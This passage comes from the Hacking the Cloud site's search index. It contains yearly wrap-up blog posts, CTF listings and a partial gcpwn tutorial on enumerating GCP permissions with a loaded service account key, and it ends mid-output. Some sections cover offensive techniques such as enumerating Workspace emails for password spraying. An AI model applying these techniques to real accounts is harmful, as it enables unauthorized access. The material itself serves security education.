5 was another happy surprise. This article deviates from the standard type of article we would normally host. Typically each page of Hacking the Cloud is dedicated to an individual technique. This article was an attempt to create a \"playbook\" that would explain how an attacker should operate in a certain situation, along with OPSEC considerations. Considering that this article has been viewed so much, I definitely plan to continue this type of content. Perhaps with accompanying video content?</p>"},{"location":"blog/2022_wrap-up/#rss-feeds","title":"RSS Feeds!","text":"<p>If you want to be the first to know when a new technique has been added to Hacking the Cloud, I have good news for you! We now have two RSS feeds thanks to the mkdocs-rss-plugin. The created feed (also linked in the footer) is the recommended feed to follow if you'd like to be notified when a new article has been added. We also have an updated feed, in case you want a notification every time a page is changed (not recommended but nobody is stopping you).</p> <p>Please note, I've been a little wary about adding RSS support to Hacking the Cloud out of fear that something will go wrong. So far, testing has been positive, but I apologize in advance if something goes haywire and you get spammed with notifications.</p>"},{"location":"blog/2022_wrap-up/#plagiarism","title":"Plagiarism","text":"<p>Last month, I was made aware that another site was copying entire articles from Hacking the Cloud and publishing them on their own site. You can see some examples below.</p> Hacking the Cloud Copy <p>As you can imagine, I was pretty unhappy with this for a number of reasons. Writing content for Hacking the Cloud takes a significant time investment. Setting up test infrastructure, getting screenshots, validating logs, ensuring everything written is 100% accurate (and fixing it when things slip through) is a huge endeavor. It is deflating and frustrating when another site claims they have more content, only for you to find a non-insignificant portion of that content was copied and pasted from your work and the work of people who took time to contribute to your project. </p> <p>Furthermore, it is even more upsetting when that site has a banner seeking company sponsorships and subscription plans, potentially profiting off of work done for Hacking the Cloud (I should mention, when asked about this, the site owner told me the site does not make money).</p> <p>I am 100% supportive of citing other researchers. It's why Hacking the Cloud has links to original research, additional resources, and references at the top of each article, front and center. However, there is a huge difference between citing someone, or crediting someone, and copying the entire article, word-for-word.</p> <p>To that site owner's credit, when I raised these concerns with them they were quick to remove the plagiarized content. To my knowledge this has not been a problem since, and I don't hold any ill-will towards them.</p> <p>Feb 2024 Update</p> <p>It has been brought to my attention that HackTricks Cloud is still engaging in blatant plagiarism of a variety of different sources, including plagiarizing Hacking the Cloud content. Please see this this Twitter thread for some examples. Please see this thread for more examples. I recommend avoiding their training course because of this. Copying and pasting blog posts and referencing those as training materials does not inspire confidence.</p> <p>As a result of this incident, however, I have added additional language to our existing Plagiarism Policy to further enforce that we will not accept plagiarized content on Hacking the Cloud. Additionally, I have added additional guarantees that I will remove links/references at the author's request (including situations that don't involve plagiarism).</p> <p>Hacking the Cloud uses the MIT License which, in retrospect, was a big mistake. When this decision was made, I was not considering the potential for someone to copy content from the site and potentially monetizing it. I have spent some time looking into this, but I am not a lawyer, I don't know a thing about copyright, and I have not had much luck finding resources on how we can better protect the site's content. If you have any experience in this domain, I would love to hear from you.</p>"},{"location":"blog/2022_wrap-up/#mastodon","title":"Mastodon","text":"<p>In a bit of an experiment, Hacking the Cloud now has its own Mastodon account! My goal with this account is to try something new. In the short term, I'd like to add a GitHub action to post to the account when a new article is published, along with posting release notes for the site.</p> <p>Long term, I'd like to cover broader cloud security news, and highlight interesting research or findings. I'm considering hooking it up to the RSS feeds of some well known blogs and sharing cloud security news that way. Feel free to give the account a follow if you're interested.</p> <p></p>"},{"location":"blog/2022_wrap-up/#plans-for-the-future","title":"Plans for the Future","text":"<p>Aside from continuing to add to the catalog of AWS attack techniques, I have three initiatives for Hacking the Cloud in 2023. The first, as mentioned previously, will be to add what I will loosely call \"playbooks\"; step by step guides demonstrating some path along the exploit chain. With this type of content, I think there is an opportunity to showcase how individual techniques can be chained together and demonstrate how an attacker can operate in a cloud environment.</p> <p>The second major initiative is to begin adding Kubernetes attacks to the mix. While not strictly cloud-specific (I'm running a kubernetes cluster 5 feet from where I'm sitting. And, no, I haven't broken into us-east-1.... yet.), it is undeniable that Kubernetes is a massive part of many organizations' security posture. Things may get a bit blurred if anything is specific to the cloud provider's implementation of Kubernetes but we'll cross that bridge when we get to it.</p> <p>And finally, I'd like to add more resources to the site related to real world attacks. Currently, I'm planning to add references to individual techniques if they were seen in the wild and where. This way, we can get an understanding of attack trends and prioritize defenses based on real-world usage.</p>"},{"location":"blog/2022_wrap-up/#conclusion","title":"Conclusion","text":"<p>I hope you had a good 2022 and have an even better 2023. May every vulnerability you find be a critical! Happy holidays!</p>"},{"location":"blog/2023_wrap-up/","title":"2023 Wrap-up","text":"<p>Nick Frichette \u00b7 @frichette_n \u00b7   December 20, 2023   </p> <p>2023 is coming to a close and it\u2019s time to look back on the year. This was the third year that Hacking the Cloud has been operating, sharing techniques on attacking and defending cloud environments. We\u2019ve added a number of new articles to the site and updated old ones. With all this in mind, here are some accomplishments for the site this year.</p>"},{"location":"blog/2023_wrap-up/#numbers","title":"Numbers","text":"<p>Here are some fun stats. All data was pulled ~6PM central, December 19th. In 2023, Hacking the Cloud has:</p> <ul> <li>457 stars gained on GitHub (1389 total)</li> <li>128 commits committed</li> <li>96,031 visits</li> <li>187,542 pageviews</li> <li>8,238 average monthly visitors (excluding December)</li> <li>And a partridge in a pear tree</li> </ul> <p>Compared to 2023, the visitor count has increased 29.9%, pageviews 50.9%, and average monthly visitors 28.6%!</p> <p>The number of total contributors to the site has also increased to 25 (up from 17). A major thank you to everyone who has contributed to building Hacking the Cloud. From the smallest fix of a typo, to writing entire articles, everything helps make the site a better source for cloud security information. All our contributors make this site possible and I appreciate their efforts deeply.</p>"},{"location":"blog/2023_wrap-up/#most-popular-articles","title":"Most popular articles","text":"<p>An area that I\u2019m always interested in are our most popular articles. What topics are cloud security professionals interested in learning about? What articles are being shared in Jira tickets to be fixed? Here are the top 5 most popular articles:</p> <ol> <li>Steal EC2 Metadata Credentials via SSRF - 16,234 pageviews!</li> <li>AWS Organizations Defaults &amp; Pivoting - 15,343 pageviews.</li> <li>Abusing Managed Identities - 5,703 pageviews.</li> <li>Using Stolen IAM Credentials - 5,594 pageviews.</li> <li>Connection Tracking - 4,869 pageviews.</li> </ol> <p>For the third year running, \u201cSteal EC2 Metadata Credentials via SSRF\u201d is our most popular article, but unlike previous years it\u2019s not by a landslide. This article, and by extension, this technique, is a cornerstone of AWS security. Stealing IAM credentials from the instance metadata service via SSRF has provided many penetration testers and red teamers the initial access they needed in an environment. Starting next year however, AWS has announced that IMDSv2 will be the only option going forward. Will this mean that this beloved technique will be a thing of the past? I guess we\u2019ll have to check the stats next year.</p> <p>In second place, and very close to first, we have \u201cAWS Organizations Defaults &amp; Pivoting\u201d. I think this rise in viewership can be attested to a growing understanding amongst offensive security professionals that cross-account trust is a huge lateral movement opportunity that can be taken advantage of. This article touches on the <code>OrganizationAccountAccessRole</code>, one of my favorite roles in AWS which potentially can be abused to take over every AWS account in an organization. A major thank you to Scott Weston for all his efforts in expanding on the article and adding more content.</p> <p>In third place, we have the first non-AWS article to ever make a top 5 (and I\u2019m pretty sure a top 10), \u201cAbusing Managed Identities\u201d. In this article Andrei Agape describes how you can take advantage of a managed identity to access other Azure resources. As an exclusively AWS person, I\u2019m excited to see more interest in other cloud providers. If you aren\u2019t an AWS person and want to share some knowledge about cloud security, feel free to open a pull request and share your knowledge with others!</p>"},{"location":"blog/2023_wrap-up/#most-popular-social-networks","title":"Most popular social networks","text":"<p>If you\u2019re interested in learning more about cloud security, you may also be interested in discussing with like-minded people. Social media can make that a lot easier. Here are the top social media websites with content that linked to Hacking the Cloud articles that got clicks.</p> <p></p> <ol> <li>LinkedIn - 42% of links</li> <li>Twitter - 30% of links</li> <li>GitHub - 13% of links</li> <li>Reddit - 9% of links</li> <li>Facebook - 6% of links</li> <li>Others - &lt;1%</li> </ol> <p>LinkedIn reigns supreme this year with 42% of all social media links. Perhaps, aside from all the hustle culture, there may be a thriving community of cloud security professionals there.</p> <p>In what may be a surprise to some (but not others), it looks like the InfoSec flight from Twitter might have some data backing it up. Twitter made up only 30% of links in 2023, down from 40% in 2022. </p> <p>For my Mastodon fans, I wouldn\u2019t worry about not showing up on the leaderboards. Because of the distributed nature of the network, there isn\u2019t a very easy way to track it. Personally, I\u2019ve found a number of technical people interested in chatting about tech. If you are on the woolly site you can even follow Hacking the Cloud on Mastodon!</p>"},{"location":"blog/2023_wrap-up/#thank-you","title":"Thank you!","text":"<p>Again, I want to say thank you to everyone who has shared the site\u2019s content, contributed to making it better, or even for just saying a kind word. Hacking the Cloud has been a passion project for years now, trying to make cloud security information more accessible for the community. Thank you all for an amazing 2023, and I look forward to 2024!</p>"},{"location":"blog/2024_wrap-up/","title":"2024 Cloud Security Highlights: Hacking the Cloud\u2019s Year in Review","text":"<p>Nick Frichette \u00b7 @frichette_n \u00b7   December 23, 2024   </p> <p>2024 is coming to a close, and it\u2019s been an incredible year for cloud security and Hacking the Cloud alike. When I started this project in 2020, the landscape of cloud attack techniques felt sparse\u2014\u201dSSRF to the metadata service\u201d was almost the only widely recognized vector. Since then, the community has driven innovation, uncovering new techniques, developing defenses, and sharing insights. This year has been no exception.</p> <p>As I look back on 2024 I wanted to share not just stats on the project but a more holistic view of all that\u2019s happened this year. If you\u2019re just interested in the site\u2019s numbers you can jump to that here.</p>"},{"location":"blog/2024_wrap-up/#2024-highlights","title":"2024 Highlights","text":""},{"location":"blog/2024_wrap-up/#fwdcloudsec-us-and-eu","title":"fwd:cloudsec US and EU","text":"<p>There are many cloud security conferences, and many of them are great, but there is one that holds an incredibly special place in my heart\u2013fwd:cloudsec. The conference hosts some of the brightest minds in cloud security and is a place for folks to gather, share ideas, and revel in our amazing community.</p> <p>This year, fwd:cloudsec was hosted in Washington D.C and featured a number of great talks. Here are just a few examples:</p> <ul> <li>GCPwn: A Pentesting Tool For GCP - Scott Weston</li> <li>Freeing Identity From Infrastructure - Ian Ferguson</li> <li>Open-Sourcing AWS Pentest Methodology - Lizzie Moratti</li> <li>Discover the AWS Account ID of any S3 bucket - Sam Cox</li> <li>Hacking clouds using the power of the sun - Ian McKay</li> <li>LUCR-3: Cloud Clepto &amp; SaaS-y Scattered Spider Shenanigans - Ian Ahl</li> <li>Get into AWS security research as a n00bcake - Daniel Grzelak</li> </ul> <p>In a sign that cloud security continues to expand, this year fwd:cloudsec went international! The first conference outside the US was hosted in the beautiful city of Brussels, Belgium. It was an incredible experience that helped bring the same cloudsec goodness to the global stage. Recommended talks from Brussels include (but really you should watch all of them):</p> <ul> <li>How to 10X Your Cloud Security (Without the Series D) - Rami McCarthy</li> <li>Hidden in Plain Sight: (Ab)using Entra's AUs - Katie Knowles</li> <li>Staying Sneaky in Microsoft Azure - Christian Philipov</li> </ul> <p>If you attended either of these conferences you may have gotten the first batch of Hacking the Cloud stickers! </p> <p></p> <p>These were a fun distraction that we\u2019ll likely continue\u2013perhaps with limited edition variants for future events? </p>"},{"location":"blog/2024_wrap-up/#my-2024","title":"My 2024","text":"<p>Hacking the Cloud has always been (and will continue to be) an independent resource for cloud security techniques. However, if you\u2019ll indulge my selfishness, I\u2019d like to share a bit about my year. 2024 has been jam packed. </p> <p>On the conference circuit, I was fortunate to speak at both fwd:cloudsec events this year. I\u2019ve said enough of how much I love fwd:cloudsec so I\u2019ll refrain from doing so here.</p> <p>This year I achieved something that I never thought I would\u2013I spoke on the main stage at DEF CON. </p> <p></p> <p>To say it was an incredible experience would be an understatement. I originally started doing security research as a hobby project. To think that those early projects would one day lead to me speaking on the biggest stage in security is beyond my own wildest dreams. It felt incredibly rewarding and I am so honored to have been given the privilege to speak.</p> <p>I want to profusely thank @TechEmiiily for being the best goon a new speaker could hope for. I also want to thank Rich Mogull for his help in welcoming me to the stage as well. If you didn\u2019t know (I sure didn\u2019t) Rich has been a DEF CON goon for many years and purely by coincidence he was around when I was preparing to go on stage.</p> <p>In addition, I spoke at Black Hat USA and the DEF CON Cloud Village. Mike Ruth and the team do a fantastic job running the village and I highly recommend it if you find yourself at hacker summer camp. </p> <p>With all the conference talks I\u2019ve done this year, in addition to all the work travel, I\u2019m probably going to take a short break from the conference circuit. I need some time to recharge and decide on a new focus for my research.</p> <p>Speaking of which, I also shared a ton of research this year with some highlights including:</p> <ul> <li>Non-Production Endpoints as an Attack Surface in AWS</li> <li>Amplified exposure: How AWS flaws made Amplify IAM roles vulnerable to takeover</li> <li>Hidden Among the Clouds: A Look at Undocumented AWS APIs</li> </ul>"},{"location":"blog/2024_wrap-up/#awseye","title":"Awseye","text":"<p>Without a doubt, to me, one of the most exciting things to come out this year was Awseye. This self-proclaimed \u201cshodan of AWS\u201d can be used to enumerate large numbers of AWS resources through a variety of methods. I\u2019m really excited for this tool to get in the hands of researchers, penetration testers, and red teamers as I think it helps close a long-running gap in tooling. </p> <p>There are many ways to enumerate resources in cloud environments, but you\u2019re unlikely to have the time to actually use all those methods. Awseye helps make those options available and enables security teams to identify when resources may be inadvertently exposed. </p>"},{"location":"blog/2024_wrap-up/#oidc-is-great-except-when-its-not","title":"OIDC is great... except when it's not","text":"<p>Open ID Connect (OIDC) is a method to establish trust between an identity provider and an AWS account. This OIDC, you can enable an entity to assume a role in your account and take action. This is great for helping discourage the use of long lived IAM credentials, but as we\u2019ve seen, it has not always gone well.</p> <p>Misconfigured OIDC to AWS trusts could permit anyone the ability to assume the role. We\u2019ve seen this with GitHub, Terraform, GitLab, and AWS\u2019 own Cognito. </p> <p>If you\u2019re an aspiring cloud security researcher, OIDC misconfigurations are most likely the easiest place to get started. There are so many technologies that use this and basically any one of them could be affected.</p>"},{"location":"blog/2024_wrap-up/#attackers-love-ai","title":"Attackers love AI","text":"<p>Historically, when an adversary compromises an AWS environment they will do one of three things: Spin up compute resources for crypto-mining, encrypt everything in sight and extort the owner for ransomware, or use the account to send spam email and text messages. In 2024, adversaries have a new fun way to monetize cloud compromise: AI. This is something we\u2019ve been seeing heavily but largely publicized thanks to reporting from Permiso and sysdig. </p> <p>Threat actors are using their compromised access to spin up AI resources and then sell access to those resources for use by others. It\u2019s an interesting look at how threat actors are willing to do just about anything to make a buck.</p>"},{"location":"blog/2024_wrap-up/#hacking-the-clouds-2024","title":"Hacking the Cloud's 2024","text":"<p>With all that out of the way, let\u2019s talk a bit about how Hacking the Cloud is doing. All data was gathered as of ~5PM central on December 22. </p>"},{"location":"blog/2024_wrap-up/#numbers","title":"Numbers","text":"<p>In 2024, Hacking the Cloud has:</p> <ul> <li>376 stars gained on GitHub (1,765 total)</li> <li>208 commits committed</li> <li>100,396 visits</li> <li>186,483 pageviews</li> <li>8,544 average monthly visitors (excluding December)</li> <li>And a partridge in a pear tree</li> </ul> <p>The number of total contributors to the site has also increased to 33 (up from 25). A major thank you to everyone who has contributed to building Hacking the Cloud. From the smallest fix of a typo, to writing entire articles, everything helps make the site a better source for cloud security information. All our contributors make this site possible and I appreciate their efforts deeply.</p>"},{"location":"blog/2024_wrap-up/#most-popular-articles","title":"Most popular articles","text":"<p>An area that I\u2019m always interested in are our most popular articles. What topics are cloud security professionals interested in learning about? What articles are being shared in Jira tickets to be fixed? Here are the top 5 most popular articles:</p> <ul> <li>AWS Organizations Defaults &amp; Pivoting - 14,831 pageviews!</li> <li>Steal EC2 Metadata Credentials via SSRF - 13,503 pageviews.</li> <li>Misconfigured Resource-Based Policies - 7,254 pageviews.</li> <li>Abusing Managed Identities - 6,148 pageviews.</li> <li>Using Stolen IAM Credentials - 5,062 pageviews.</li> </ul> <p>The surprise here is that for the first time ever, \u201cSteal EC2 Metadata Credentials via SSRF\u201d is not the number one most popular article. It\u2019s only fallen from first to second, but I think this is the start of the technique falling out of fashion. </p> <p>AWS has taken a number of steps to discourage the use of IMDSv1 and it appears they are starting to work. In some ways it\u2019s sad. As I mentioned above, SSRF to the metadata service was the original cloud hacking technique. Over time we may see it phased out completely.</p> <p>Outside of this, the new addition this year is that \u201cMisconfigured Resource-Based Policies\u201d has jumped into third place. Resource-based policy misconfigurations are an ever present topic in cloud exploitation and it isn\u2019t a terrible surprise that they would be near the top. </p>"},{"location":"blog/2024_wrap-up/#most-popular-social-networks","title":"Most popular social networks","text":"<p>If you\u2019re interested in learning more about cloud security, you may also be interested in discussing with like-minded people. Social media can make that a lot easier. Here are the top social media websites with content that linked to Hacking the Cloud articles that got clicks.</p> <p></p> <ol> <li>LinkedIn - 40% of visits (-2% from last year)</li> <li>Twitter - 23% of visits (-7% from last year)</li> <li>Reddit - 20% of visits (+11% from last year)</li> <li>GitHub - 14% of visits (+1% from last year)</li> <li>Facebook - 1% of visits (-5% from last year)</li> </ol> <p>In general the trends that were established last year are continuing: LinkedIn is still far and away the largest source of visits from social media, although it has waned a small amount. </p> <p>Twitter continues to decline, down 7 percent from last year. Reddit got a surprise bump this year by 11% and it\u2019s not clear what may have caused that. </p> <p>For our friends in Bluesky, worry not, we currently do not track that data at all. Hopefully it will be ready for next year\u2019s social media break down.</p>"},{"location":"blog/2024_wrap-up/#thank-you","title":"Thank you!","text":"<p>Thank you to everyone who contributed, shared, and engaged with Hacking the Cloud this year. Your support fuels this project. I\u2019m excited for what 2025 holds\u2014stay tuned for more cloud security insights, and if you\u2019re passionate about cloud research, consider contributing!</p>"},{"location":"blog/v2_new_look/","title":"Hacking The Cloud v2: New Look","text":"<p>Nick Frichette \u00b7 @frichette_n \u00b7   December 6, 2021   </p> <p>Whoa! Things look a little different? You're not imagining it.</p> <p> </p> The old look. <p>Hacking The Cloud now uses Material for MkDocs to render the beautiful HTML you see before you.</p>"},{"location":"blog/v2_new_look/#why-the-change","title":"Why the Change?","text":"<p>When Hacking The Cloud was first started in mid-2020, I was primarily focused on getting the project off the ground and wasn't particularly interested in the formatting or appearance. This resulted in the choice to use a familiar technology (Hugo) and finding a freely available theme for it (zDoc).</p> <p>This helped get the project up and running quickly and allowed me to work on getting the first few pages created. Over time, however, small changes were need. Increased font size, changes to the navigation layout, CSS tweaks, etc. Recently more time has been spent making sure things looked okay rather than actually creating content.</p> <p>To be clear, the zDoc theme is excellent, there were just some changes needed that made the theme difficult to use for our purposes. These needs, combined with the appearance that the theme is no longer actively maintained, had caused me to look for something different.</p>"},{"location":"blog/v2_new_look/#why-material-for-mkdocs","title":"Why Material for MkDocs?","text":"<p>For the past several months I've been looking for a suitable replacement. My list of requirements was high. Additionally, I was looking for something simple, easy to use, and wouldn't have me constantly thinking, \"does this look okay on mobile?\".</p> <p>By pure luck, I found what I was looking for. Kinnaird McQuade happened to retweet an announcement from the Material for MkDocs project, and I was hooked. It looked great, supported Markdown, had admonitions, code blocks, produced static HTML, client-side search, and just about everything else I was looking for. </p> <p>More than that, it's fun and easy to work with.</p> <p>If you'd like to support Material for MkDocs you can join me in sponsoring the project.</p>"},{"location":"blog/v2_new_look/#what-does-this-mean-for-you","title":"What Does This Mean for You?","text":"<p>Honestly, not a whole lot. Hacking the Cloud will now look a lot better on desktop and mobile. This will free up time and resources to focus on what actually matters, the content.</p> <p>For folks interested in contributing, you are only a pull request away! Our contributing guide has everything you need to get up and running. If you have any questions or ideas feel free to start a conversation on our discussions page.</p>"},{"location":"gcp/capture_the_flag/gcp-goat/","title":"GCP Goat","text":"<p>GCP-Goat is the vulnerable application for learning the Google Cloud Security</p> <p>The Application consists of the following scenarios</p> <ul> <li>Attacking Compute Engine</li> <li>Attacking Sql Instance</li> <li>Attacking GKE</li> <li>Attacking GCS</li> <li>Privilege Escalation</li> <li>Privilege Escalation in Compute Engine</li> </ul> <p>Project-Link </p>"},{"location":"gcp/capture_the_flag/thunder_ctf/","title":"Thunder CTF","text":"<p>Thunder CTF allows players to practice attacking vulnerable cloud projects on Google Cloud Platform (GCP). In each level, players are tasked with exploiting a cloud deployment to find a \"secret\" integer stored within it. Key to the CTF is a progressive set of hints that can be used by players when they are stuck so that levels can be solved by players of all levels from novices to experts.</p> <p>The CTF is available at https://thunder-ctf.cloud/.</p> <p>The GitHub repository for the Thunder CTF also includes:</p> <ul> <li>Least Privileges</li> <li>Cloud Audit</li> </ul> <p>Least Privilege CTF (slides) is an extension of Thunder CTF. Least Privilege levels have been desgined to help understand Google Cloud Platform's IAM roles and permissions.</p> <p>Cloud Audit is a series of code labs that will walk you through a few basic and a few more advanced cloud security concepts from a defender point of view.</p>"},{"location":"gcp/capture_the_flag/thunder_ctf/#links","title":"Links:","text":"<ul> <li>Website</li> <li>GitHub</li> </ul>"},{"location":"gcp/enumeration/enum_email_addresses/","title":"Unauthenticated Enumeration of Valid Google Workspace Email Addresses","text":"<p>You can enumerate valid email addresses associated with the Google Workspace service using Quiet Riot. These addresses can be used for password spraying attacks, a technique where an attacker attempts to authenticate against multiple accounts using a set of commonly used passwords. This can potentially grant unauthorized access to the target account. It can also be used to test for valid Root User accounts in AWS, assuming that the email address is the same. Then, a similar password spraying approach can be implemented against identified AWS Root User accounts.</p>"},{"location":"gcp/enumeration/enumerate_all_permissions/","title":"Enumerate Org/Folder/Project Permissions + Individual Resource Permissions","text":"<ul> <li> <p> Tools mentioned in this article</p> <p>gcpwn</p> </li> </ul>"},{"location":"gcp/enumeration/enumerate_all_permissions/#what-is-testiampermissions","title":"What is testIamPermissions?","text":"<p>GCP offers a \"testIamPermissions\" API call on most resources that support policies. This includes resources like:</p> <ul> <li>Organizations</li> <li>Folders</li> <li>Projects</li> <li>Compute Instances</li> <li>Cloud Functions</li> </ul> <p>In MOST cases, the general psuedo-code is the same regardless of the resource. However, the permissions allowed are usually dependent on the resource. </p> <p>For example, for \"Projects\" (probably 99% of people's interest), testIamPermissions is documented here. Note the general pattern is passing in an array (or list) of individual permissions and the service will return the list of permissions the caller is allowed in that specific project. So in the example below, we pass in a large number of permissions and maybe just \"cloudfunctions.functions.list\" is returned indicating our caller has that permission within this project (aka, can list all cloud functions in this project).</p> <pre><code># Input\n{\n  \"permissions\": [\n    compute.instances.addAccessConfig\n    cloudfunctions.functions.list\n    etc\n  ]\n}\n\n# Output\n{\n  \"permissions\": [\n     cloudfunctions.functions.list\n  ]\n}\n</code></pre> <p>However, testIamPermissions does NOT just exist for projects. The compute service allows you to specify permissions at the compute instance level (as opposed to the project level). As such, testIamPermissions actually exists for instances as well shown in the documentation here. You'll notice the API call is pretty much the same as the projects API call in that it takes in a big list of permission and returns the list of permissions the caller has on THAT specific instance; we are just calling testIamPermissions on the instance as opposed to the project. Also note we could not pass in \"cloudfunctions.functions.list\", for example, to the instances testIamPermissions as it will only accept instance-level permissions.</p> <pre><code># Input\n{\n  \"permissions\": [\n                'compute.instances.addAccessConfig',\n                'compute.instances.addMaintenancePolicies',\n                'compute.instances.addResourcePolicies',\n                'compute.instances.attachDisk',\n                'compute.instances.createTagBinding',\n                'compute.instances.delete',\n                'compute.instances.deleteAccessConfig',\n                'compute.instances.deleteTagBinding',\n                'compute.instances.detachDisk',\n                'compute.instances.get',\n                'compute.instances.getEffectiveFirewalls',\n                'compute.instances.getGuestAttributes',\n                'compute.instances.getIamPolicy',\n                'compute.instances.getScreenshot',\n                'compute.instances.getSerialPortOutput',\n                'compute.instances.getShieldedInstanceIdentity',\n                'compute.instances.getShieldedVmIdentity',\n                'compute.instances.listEffectiveTags',\n                'compute.instances.listReferrers',\n                'compute.instances.listTagBindings',\n                'compute.instances.osAdminLogin',\n                'compute.instances.osLogin',\n                'compute.instances.removeMaintenancePolicies',\n                'compute.instances.removeResourcePolicies',\n                'compute.instances.reset',\n                'compute.instances.resume',\n                'compute.instances.sendDiagnosticInterrupt',\n                'compute.instances.setDeletionProtection',\n                'compute.instances.setDiskAutoDelete',\n                'compute.instances.setIamPolicy',\n                'compute.instances.setLabels',\n                'compute.instances.setMachineResources',\n                'compute.instances.setMachineType',\n                'compute.instances.setMetadata',\n                'compute.instances.setMinCpuPlatform',\n                'compute.instances.setName',\n                'compute.instances.setScheduling',\n                'compute.instances.setSecurityPolicy',\n                'compute.instances.setServiceAccount',\n                'compute.instances.setShieldedInstanceIntegrityPolicy',\n                'compute.instances.setShieldedVmIntegrityPolicy',\n                'compute.instances.setTags',\n                'compute.instances.simulateMaintenanceEvent',\n                'compute.instances.start',\n                'compute.instances.startWithEncryptionKey',\n                'compute.instances.stop',\n                'compute.instances.suspend',\n                'compute.instances.update',\n                'compute.instances.updateAccessConfig',\n                'compute.instances.updateDisplayDevice',\n                'compute.instances.updateNetworkInterface',\n                'compute.instances.updateSecurity',\n                'compute.instances.updateShieldedInstanceConfig',\n                'compute.instances.updateShieldedVmConfig',\n                'compute.instances.use',\n                'compute.instances.useReadOnly'\n  ]\n}\n\n# Output\n{\n  \"permissions\": [\n                'compute.instances.start',\n                'compute.instances.startWithEncryptionKey',\n                'compute.instances.stop',\n  ]\n}\n</code></pre>"},{"location":"gcp/enumeration/enumerate_all_permissions/#gcpwn-introduction","title":"GCPwn Introduction","text":"<p>gcpwn is a tool that will run testIamPermission on all resources identified if specified by the end user. This means it will cover testIamPermission test cases for organizations, projects, folders, compute instances, cloud functions, cloud storage (buckets), service accounts, etc. For orgs/projects/folders it runs a small list of permissions as the input but you can specify through flags to brute force ~9500 permissions.</p> <p>To install the tool, follow the installation instructions here. Once installed, review the \"Common Use Cases\" which covers both of the items above.</p> <p>To see a live demo, you can watch this which covers testIamPermissions briefly.</p> <p>Note</p> <p>The tool will also passively record all API permissions you were able to call regardless if testIamPermissions is used, testIamPermissions just will give you more permissions back usually.</p>"},{"location":"gcp/enumeration/enumerate_all_permissions/#enumerate-permissions-on-individual-resources","title":"Enumerate Permissions on Individual Resources","text":"<p>Each enumeration  module (ex. <code>enum_instances</code>) in the tool allows you to pass in an <code>--iam</code> flag that will call testIamPermissions on the resource while enumerating it. Once run, you can run <code>creds info</code> as shown below and this will list out all the permissions your caller has. Review the POC below.</p> <ol> <li>Show the value for the service account key. Note the  same technique can be used for application default credentials (username/password) as well as standalone Oauth2 tokens</li> <li>Start up the tool via <code>python3 main.py</code>. Load in the service account credentials for the file we just showed.</li> <li>Now that the credentials are loaded in and the project is set (Note if project is <code>Unknown</code> you can set it with <code>projects set &lt;project_id&gt;</code>), run <code>creds info</code> and note that NO permissions are known for the current user</li> <li>Run enum_instances and see an instance is found. Run <code>creds info</code> again and note that permission are now populated saying the user has <code>compute.instances.list</code> on the project and <code>compute.instances.get</code> on the instance itself.</li> <li>Run enum_instances again but now include testIamPermission calls with the <code>--iam</code> flag. Run <code>creds info</code> again and note way more permissions were identified for the specified compute instance as gcpwn ran testIamPermissions during the enumeration phaes and saved the results. Now we can see our caller has not just <code>compute.instances.get</code> but <code>compute.instances.addAccessConfig</code>, <code>compute.instances.addMaintenancePolicies</code>, <code>compute.instances.addResourcePolicies</code>, etc. on <code>instance-20240630-025631</code></li> <li>This is hard to read. So you can pass in <code>--csv</code> with <code>creds info</code> to export it to an easy to read Excel file. creds info will highlight \"dangerous\" permissions red and the resulting CSV has a column for True/False for dangerous permissions.</li> </ol> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/gcpwn]\n\u2514\u2500$ cat key.json\n{\n  \"type\": \"service_account\",\n  \"project_id\": \"production-project[TRUNCATED]\",\n  \"private_key_id\": \"2912[TRUNCATED]\",\n  \"private_key\": \"-----BEGIN PRIVATE KEY-----\\nMIIEvQIBADANBgkqhkiG9w0B[RECACTED]\\n-----END PRIVATE KEY-----\\n\",\n  \"client_email\": \"newserviceaccount@production-project[TRUNCATED].iam.gserviceaccount.com\",\n  \"client_id\": \"11[TRUNCATED]\",\n  \"auth_uri\": \"https://accounts.google.com/o/oauth2/auth\",\n  \"token_uri\": \"https://oauth2.googleapis.com/token\",\n  \"auth_provider_x509_cert_url\": \"https://www.googleapis.com/oauth2/v1/certs\",\n  \"client_x509_cert_url\": \"https://www.googleapis.com/robot/v1/metadata/x509/newserviceaccount%40production-project[TRUNCATED].iam.gserviceaccount.com\",\n  \"universe_domain\": \"googleapis.com\"\n}\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/gcpwn]\n\u2514\u2500$ python3 main.py \n[*] No workspaces were detected. Please provide the name for your first workspace below.\n&gt; New workspace name: DemoWorkspace\n[*] Workspace 'DemoWorkspace' created.\n\n[TRUNCATED]\n\n[*] Listing existing credentials...\n\n\nSubmit the name or index of an existing credential from above, or add NEW credentials via Application Default \nCredentails (adc - google.auth.default()), a file pointing to adc credentials, a standalone OAuth2 Token, \nor Service credentials. See wiki for details on each. To proceed with no credentials just hit ENTER and submit \nan empty string. \n[1] *adc      &lt;credential_name&gt; [tokeninfo]                    (ex. adc mydefaultcreds [tokeninfo]) \n[2] *adc-file &lt;credential_name&gt; &lt;filepath&gt; [tokeninfo]         (ex. adc-file mydefaultcreds /tmp/name2.json)\n[3] *oauth2   &lt;credential_name&gt; &lt;token_value&gt; [tokeninfo]      (ex. oauth2 mydefaultcreds ya[TRUNCATED]i3jJK)  \n[4] service   &lt;credential_name&gt; &lt;filepath_to_service_creds&gt;    (ex. service mydefaultcreds /tmp/name2.json)\n\n*To get scope and/or email info for Oauth2 tokens (options 1-3) include a third argument of \n\"tokeninfo\" to send the tokens to Google's official oauth2 endpoint to get back scope. \ntokeninfo will set the credential name for oauth2, otherwise credential name will be used.\nAdvised for best results. See https://cloud.google.com/docs/authentication/token-types#access-contents.\nUsing tokeninfo will add scope/email to your references if not auto-picked up.\n\nInput: service service_user /home/kali/gcpwn/key.json\n[*] Credentials successfuly added\nLoading in Service Credentials...\n[*] Loaded credentials service_user\n(production-project[TRUNCATED]:service_user)&gt; creds info\n\nSummary for service_user:\nEmail: newserviceaccount@production-project[TRUNCATED].iam.gserviceaccount.com\nScopes:\n    - N/A\nDefault Project: production-project[TRUNCATED]\nAll Projects:\n\nAccess Token: N/A\n(production-project[TRUNCATED]:service_user)&gt; modules run enum_instances\n[*] Checking production-project[TRUNCATED] for instances...\n[**] Reviewing instance-20240630-025631\n[***] GET Instance\n[SUMMARY] GCPwn found 1 Instances in production-project[TRUNCATED]\n   - zones/us-central1-c                                                                                                                                                                    \n     - instance-20240630-025631                                                                                                                                                             \n(production-project[TRUNCATED]:service_user)&gt; creds info\n\nSummary for service_user:\nEmail: 